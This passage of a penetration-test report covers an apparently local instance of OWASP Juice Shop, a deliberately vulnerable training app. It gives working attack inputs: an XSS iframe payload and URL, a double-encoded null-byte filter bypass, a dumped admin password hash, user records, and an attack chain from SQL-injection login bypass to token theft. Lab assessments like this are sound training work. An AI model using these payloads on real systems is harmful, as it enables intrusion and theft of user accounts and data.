Decoded payload also leaks the admin MD5 password hash `6b5e7fab1c26eb98ced96aa5f7cae5d7` directly in the JWT claims — bonus sensitive-data exposure.
**Impact:** Full administrative takeover without credentials.

## 2. [HIGH] DOM-based Cross-Site Scripting (XSS)
**Sink:** Search results heading renders `#/search?q=<payload>` via `bypassSecurityTrustHtml`.
**Payload:** `<iframe src="javascript:alert(\`xss\`)">`
**URL:** `http://127.0.0.1:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E`
**Proof:** 12 auto-closed `alert('xss')` dialogs fired in-browser and an `<iframe src="javascript:alert(`xss`)">` DOM element (index [1667]) was injected into the search-result heading — visible in the browser state. Captured via `dialog` events and DOM query.
**Impact:** Arbitrary JS execution in any victim's session → cookie/token theft, account takeover.

## 3. [HIGH] Broken Access Control / IDOR — User Database Dump
**Endpoint:** `GET /api/Users` (with stolen admin JWT)
**Proof:** Returned **22 user records** including emails, roles and **hashed passwords**. First 5:
```
id=1  admin@juice-sh.op           role=admin
id=2  jim@juice-sh.op             role=customer
id=3  bender@juice-sh.op          role=customer
id=4  bjoern.kimminich@gmail.com  role=admin
id=5  ciso@juice-sh.op            role=deluxe
```
Also dumped `/api/SecurityQuestions` (3 questions incl. "Mother's maiden name") and `/api/Application-Configuration` (full server config exposed without auth).
**Impact:** Mass PII exposure, offline hash cracking, targeted account takeover.

## 4. [HIGH] Local File Inclusion / Path Traversal — /ftp Directory
**Endpoint:** `GET /ftp/` and `GET /ftp/<file>`
**Proof of open directory listing:** `/ftp/` returned the full HTML listing (HTTP 200).
**Confidential file leaked:** `/ftp/acquisitions.md` (HTTP 200):
> "# Planned Acquisitions — This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year..."
**Null-byte extension-filter bypass (Poison Null Byte):**
- `/ftp/package.json.bak` → 403 "Only .md and .pdf files are allowed!"
- `/ftp/package.json.bak%2500.md` (double-encoded `%00`) → **200 OK**, full contents of `package.json.bak` leaked, revealing juice-shop v6.2.0-SNAPSHOT internals, author `bjoern.kimminich@owasp.org`, contributors, dependency tree.
**Impact:** Confidential M&A data leak + source-code/dependency disclosure for further supply-chain attacks.

## 5. [MEDIUM] Sensitive Data Exposure via JWT & Config
- JWT returned on login contains the **full user record including the password hash** (no stripping before signing).
- `/api/Application-Configuration` reachable anonymously — reveals server/application/challenge/ctf settings.
- `/ftp/legal.md` and directory listing accessible anonymously.

## Attack Chain (end-to-end takeover)
1. SQLi on `/rest/user/login` → admin JWT (no credentials needed).
2. JWT payload itself leaks admin password hash.
3. Use JWT → `/api/Users` IDOR → dump 22 users + hashes.
4. `/ftp/` open directory → exfiltrate `acquisitions.md`.
5. `%00.md` null-byte bypass on `/ftp` → exfiltrate `package.json.bak` (source-level info).
6. Reflected DOM XSS via `#/search?q=` → weaponise against any user to steal tokens and chain back to step 1.
